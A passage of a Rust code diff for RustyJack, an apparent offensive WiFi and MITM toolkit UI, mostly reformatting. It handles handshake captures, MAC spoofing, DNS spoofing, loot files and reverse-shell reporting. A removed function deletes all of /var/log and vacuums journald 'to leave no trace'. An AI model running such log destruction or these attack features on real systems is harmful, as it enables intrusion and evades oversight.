             .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))?
             .take()
             .ok_or_else(|| anyhow::anyhow!("Attack result not available"))?;
@@ -3843,7 +5452,8 @@ impl App {
                         if let Some(hf) = data.get("handshake_file").and_then(|v| v.as_str()) {
                             result_lines.push(format!(
                                 "File: {}",
-                                Path::new(hf).file_name()
+                                Path::new(hf)
+                                    .file_name()
                                     .and_then(|n| n.to_str())
                                     .unwrap_or("handshake.cap")
                             ));
@@ -3864,7 +5474,8 @@ impl App {
                 if let Some(log) = data.get("log_file").and_then(|v| v.as_str()) {
                     result_lines.push(format!(
                         "Log: {}",
-                        Path::new(log).file_name()
+                        Path::new(log)
+                            .file_name()
                             .and_then(|n| n.to_str())
                             .unwrap_or("log.txt")
                     ));
@@ -3909,15 +5520,37 @@ impl App {
             );
         }
 
-        // Let user select a profile
+        // Offer import from USB + saved profiles
+        let mut options = vec!["Import from USB".to_string()];
         let profile_names: Vec<String> = profiles.iter().map(|p| p.ssid.clone()).collect();
-        let choice = self.choose_from_list("Select Network", &profile_names)?;
+        options.extend(profile_names.clone());
+
+        if options.len() == 1 {
+            // No profiles and user declined import
+            if let Some(choice) = self.choose_from_list(
+                "No profiles found",
+                &["Import from USB".to_string(), "Cancel".to_string()],
+            )? {
+                if choice == 0 {
+                    self.import_wifi_from_usb()?;
+                }
+            }
+            return Ok(());
+        }
+
+        // Let user select a profile
+        let choice = self.choose_from_list("Select Network", &options)?;
 
         let Some(idx) = choice else {
             return Ok(());
         };
 
-        let selected = &profiles[idx];
+        if idx == 0 {
+            self.import_wifi_from_usb()?;
+            return Ok(());
+        }
+
+        let selected = &profiles[idx - 1];
         self.connect_named_profile(&selected.ssid)?;
 
         Ok(())
@@ -6496,10 +8129,14 @@ impl App {
                     let original_mac = state.original_mac.to_string();
                     let new_mac = state.current_mac.to_string();
 
-                    self.config.settings.original_macs
+                    self.config
+                        .settings
+                        .original_macs
                         .entry(active_interface.clone())
                         .or_insert_with(|| original_mac.clone());
-                    self.config.settings.current_macs
+                    self.config
+                        .settings
+                        .current_macs
                         .insert(active_interface.clone(), new_mac.clone());
                     let config_path = self.root.join("gui_conf.json");
                     let _ = self.config.save(&config_path);
@@ -6514,7 +8151,7 @@ impl App {
                         original_mac,
                         "".to_string(),
                     ];
-                    
+
                     if reconnect_ok {
                         lines.push("DHCP renewed and".to_string());
                         lines.push("reconnect signaled.".to_string());
@@ -6523,11 +8160,7 @@ impl App {
                         lines.push("have failed. Check DHCP.".to_string());
                     }
 
-                    self.scrollable_text_viewer(
-                        "MAC Randomized",
-                        &lines,
-                        false,
-                    )
+                    self.scrollable_text_viewer("MAC Randomized", &lines, false)
                 }
                 Err(e) => self.show_message(
                     "MAC Error",
@@ -6584,9 +8217,11 @@ impl App {
             ) {
                 Ok(state) => {
                     let reconnect_ok = renew_dhcp_and_reconnect(&interface);
-                    
+
                     let new_mac = state.current_mac.to_string();
-                    self.config.settings.current_macs
+                    self.config
+                        .settings
+                        .current_macs
                         .insert(interface.clone(), new_mac.clone());
                     let config_path = self.root.join("gui_conf.json");
                     let _ = self.config.save(&config_path);
@@ -6595,7 +8230,7 @@ impl App {
                         format!("Set to {}", selected_vendor.name),
                         format!("New: {}", new_mac),
                     ];
-                    
+
                     if !reconnect_ok {
                         lines.push("".to_string());
                         lines.push("Warning: reconnect may".to_string());
@@ -6627,27 +8262,28 @@ impl App {
         }
 
         // Check if we have a saved original MAC
-        let original_mac = if let Some(mac) = self.config.settings.original_macs.get(&active_interface) {
-            mac.clone()
-        } else {
-            // Try to read the permanent hardware address
-            let perm_path = format!("/sys/class/net/{}/address", active_interface);
-            match std::fs::read_to_string(&perm_path) {
-                Ok(mac) => mac.trim().to_uppercase(),
-                Err(_) => {
-                    return self.show_message(
-                        "Restore MAC",
-                        [
-                            "No original MAC saved",
-                            "",
-                            "MAC was not changed by",
-                            "RustyJack, or original",
-                            "was not recorded.",
-                        ],
-                    );
+        let original_mac =
+            if let Some(mac) = self.config.settings.original_macs.get(&active_interface) {
+                mac.clone()
+            } else {
+                // Try to read the permanent hardware address
+                let perm_path = format!("/sys/class/net/{}/address", active_interface);
+                match std::fs::read_to_string(&perm_path) {
+                    Ok(mac) => mac.trim().to_uppercase(),
+                    Err(_) => {
+                        return self.show_message(
+                            "Restore MAC",
+                            [
+                                "No original MAC saved",
+                                "",
+                                "MAC was not changed by",
+                                "RustyJack, or original",
+                                "was not recorded.",
+                            ],
+                        );
+                    }
                 }
-            }
-        };
+            };
 
         self.show_progress("Restore MAC", [&format!("Restoring: {}", original_mac)])?;
 
@@ -6669,7 +8305,7 @@ impl App {
         match result {
             Ok(output) if output.status.success() => {
                 let reconnect_ok = renew_dhcp_and_reconnect(&active_interface);
-                
+
                 self.config.settings.current_macs.remove(&active_interface);
                 self.config.settings.original_macs.remove(&active_interface);
                 let config_path = self.root.join("gui_conf.json");
@@ -6677,13 +8313,8 @@ impl App {
 
                 let interface_line = format!("Interface: {}", active_interface);
                 let mac_line = format!("MAC: {}", original_mac);
-                let mut lines = vec![
-                    &interface_line,
-                    "",
-                    &mac_line,
-                    "",
-                ];
-                
+                let mut lines = vec![&interface_line, "", &mac_line, ""];
+
                 if reconnect_ok {
                     lines.push("Original MAC restored.");
                 } else {
@@ -6694,20 +8325,16 @@ impl App {
 
                 self.show_message("MAC Restored", lines)
             }
-            Ok(_) => {
-                self.show_message(
-                    "Restore Error",
-                    [
-                        "Failed to restore MAC",
-                        "",
-                        "Try rebooting to reset",
-                        "the interface.",
-                    ],
-                )
-            }
-            Err(_) => {
-                self.show_message("Restore Error", ["Failed to execute", "restore command."])
-            }
+            Ok(_) => self.show_message(
+                "Restore Error",
+                [
+                    "Failed to restore MAC",
+                    "",
+                    "Try rebooting to reset",
+                    "the interface.",
+                ],
+            ),
+            Err(_) => self.show_message("Restore Error", ["Failed to execute", "restore command."]),
         }
     }
 
@@ -7392,7 +9019,9 @@ impl App {
                 .core
                 .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Stop));
             match self.core.dispatch(Commands::Mitm(MitmCommand::Stop)) {
-                Ok((msg, _)) => self.show_message("MITM Stopped", [msg, "IP forwarding disabled".to_string()]),
+                Ok((msg, _)) => {
+                    self.show_message("MITM Stopped", [msg, "IP forwarding disabled".to_string()])
+                }
                 Err(e) => self.show_message(
                     "MITM Stop Error",
                     ["Failed to stop MITM".to_string(), format!("{}", e)],
@@ -8414,12 +10043,19 @@ impl App {
             lines.push("Post-connection payloads:".to_string());
             if reverse_shells > 0 {
                 lines.push(format!("Reverse shells launched: {}", reverse_shells));
-                insights.push("Reverse shells were launched; ensure callbacks stay controlled.".to_string());
-                next_steps.push("Review payload.log and close shells that are no longer needed.".to_string());
+                insights.push(
+                    "Reverse shells were launched; ensure callbacks stay controlled.".to_string(),
+                );
+                next_steps.push(
+                    "Review payload.log and close shells that are no longer needed.".to_string(),
+                );
             }
             if bridge_events > 0 {
                 lines.push(format!("Bridge toggles logged: {}", bridge_events));
-                insights.push("Transparent bridge used; captures may hold in-transit credentials.".to_string());
+                insights.push(
+                    "Transparent bridge used; captures may hold in-transit credentials."
+                        .to_string(),
+                );
                 next_steps.push("Review bridge PCAPs for credentials/session tokens.".to_string());
             }
             if bridge_pcaps > 0 {
@@ -8731,7 +10367,9 @@ impl App {
             return Ok(None);
         }
         files.sort();
-        let latest = files.last().cloned()
+        let latest = files
+            .last()
+            .cloned()
             .ok_or_else(|| anyhow::anyhow!("No loot files found in directory"))?;
         let data = fs::read_to_string(&latest)
             .with_context(|| format!("Failed to read loot file: {}", latest))?;
@@ -9259,7 +10897,7 @@ impl App {
         }
 
         self.show_progress("Complete Purge", ["Removing Rustyjack...", "Please wait"])?;
-        let report = self.perform_complete_purge(&root);
+        let report = perform_complete_purge(&root);
 
         let mut lines = vec![
             format!("Removed {} item(s)", report.removed),
@@ -9287,102 +10925,6 @@ impl App {
 
         self.show_message("Complete Purge", lines)?;
         std::process::exit(0);
-    }
-
-    fn perform_complete_purge(&self, root: &Path) -> PurgeReport {
-        let mut removed = 0usize;
-        let mut errors = Vec::new();
-        let mut service_disabled = false;
-
-        // Move to a safe working directory so the Rustyjack tree can be deleted.
-        let _ = std::env::set_current_dir("/tmp");
-
-        let mut delete_path = |path: &Path, errors: &mut Vec<String>| {
-            if !path.exists() {
-                return;
-            }
-            if path == Path::new("/") {
-                errors.push("Refused to delete /".to_string());
-                return;
-            }
-            let res = if path.is_dir() {
-                fs::remove_dir_all(path)
-            } else {
-                fs::remove_file(path)
-            };
-            match res {
-                Ok(_) => removed += 1,
-                Err(e) => errors.push(format!("{}: {}", path.display(), e)),
-            }
-        };
-
-        // Disable unit so it cannot restart.
-        if let Ok(status) = Command::new("systemctl")
-            .args(["disable", "rustyjack.service"])
-            .status()
-        {
-            if status.success() {
-                service_disabled = true;
-            } else {
-                errors.push("systemctl disable rustyjack.service failed".to_string());
-            }
-        } else {
-            errors.push("systemctl disable rustyjack.service failed".to_string());
-        }
-
-        let system_paths = [
-            PathBuf::from("/usr/local/bin/rustyjack-ui"),
-            PathBuf::from("/etc/systemd/system/rustyjack.service"),
-            PathBuf::from("/etc/systemd/system/multi-user.target.wants/rustyjack.service"),
-            PathBuf::from("/etc/udev/rules.d/99-rustyjack-wifi.rules"),
-        ];
-        for path in system_paths.iter() {
-            delete_path(path, &mut errors);
-        }
-
-        // Remove loot, logs, cache, and source tree.
-        let data_paths = [
-            root.join("loot"),
-            root.join("Responder"),
-            root.join("wifi"),
-            root.join("scripts"),
-            root.join("target"),
-            root.to_path_buf(),
-        ];
-        for path in data_paths.iter() {
-            delete_path(path, &mut errors);
-        }
-
-        // Remove system logs to leave no trace.
-        for entry in WalkDir::new("/var/log").into_iter().filter_map(|e| e.ok()) {
-            if entry.file_type().is_file() {
-                let path = entry.path();
-                match fs::remove_file(path) {
-                    Ok(_) => removed += 1,
-                    Err(e) => errors.push(format!("{}: {}", path.display(), e)),
-                }
-            }
-        }
-
-        // Clear journald history.
-        let _ = Command::new("journalctl").arg("--rotate").status();
-        let _ = Command::new("journalctl").arg("--vacuum-time=1s").status();
-        let _ = Command::new("journalctl").arg("--vacuum-size=1K").status();
-
-        // Reload systemd to drop unit references.
-        let _ = Command::new("systemctl").arg("daemon-reload").status();
-        let _ = Command::new("systemctl")
-            .args(["reset-failed", "rustyjack.service"])
-            .status();
-
-        // Flush writes before exiting.
-        let _ = Command::new("sync").status();
-
-        PurgeReport {
-            removed,
-            service_disabled,
-            errors,
-        }
     }
 
     fn purge_logs(&mut self) -> Result<()> {
@@ -9626,8 +11168,8 @@ impl App {
                         };
                         let mut upstream_note = String::new();
                         if upstream_choice == Some(0) {
-                            upstream_note = "No upstream selected; hotspot will have no internet."
-                                .to_string();
+                            upstream_note =
+                                "No upstream selected; hotspot will have no internet.".to_string();
                         } else if !upstream_iface.is_empty() && !interface_has_ip(&upstream_iface) {
                             upstream_note = format!(
                                 "{} has no IP; hotspot will be local-only until it connects.",
@@ -9741,7 +11283,10 @@ impl App {
                                     shorten_for_display(&err, 90),
                                 ];
                                 if err.contains("AP mode") {
-                                    lines.push("Selected AP interface may not support AP mode.".to_string());
+                                    lines.push(
+                                        "Selected AP interface may not support AP mode."
+                                            .to_string(),
+                                    );
                                 }
                                 if err.contains("Required tool missing") {
                                     lines.push("Install hostapd, dnsmasq, and iptables (installer covers this).".to_string());
@@ -9780,6 +11325,3 @@ impl App {
         }
     }
 }
-
-#[cfg(target_os = "linux")]
-fn renew_dhcp_and_reconnect(interface: &str) -> bool {
